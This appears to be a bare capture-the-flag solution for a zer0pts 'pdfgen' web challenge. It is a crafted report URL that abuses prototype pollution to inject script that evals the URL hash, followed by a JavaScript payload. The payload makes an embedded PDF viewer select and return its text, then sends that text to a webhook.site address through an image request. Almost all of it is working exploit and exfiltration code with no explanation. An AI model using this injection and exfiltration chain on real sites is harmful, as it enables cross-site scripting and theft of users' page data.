Report : https://pdfgen.ctf.zer0pts.com:8443/text?text=asd&a[constructor][prototype][props][][value]=a&a[constructor][prototype][name]=a":''.constructor.constructor('eval(decodeURIComponent(location.hash.slice(1)))')(),"a#
window.addEventListener('message', (e) => {
  if (e.data.type === 'getSelectedTextReply') {
    (new Image).src = ['https://webhook.site/1d9e11f1-9421-40d3-954f-8c2712c9d16e?data=', e.data.selectedText];
  }
});
(async () => {
  const wait = x => new Promise(r=>{setTimeout(r,x)});
  document.getElementsByTagName('embed')[0].postMessage({type:'selectAll'}, '*');
  document.getElementsByTagName('embed')[0].postMessage({type:'getSelectedText'}, '*');
})();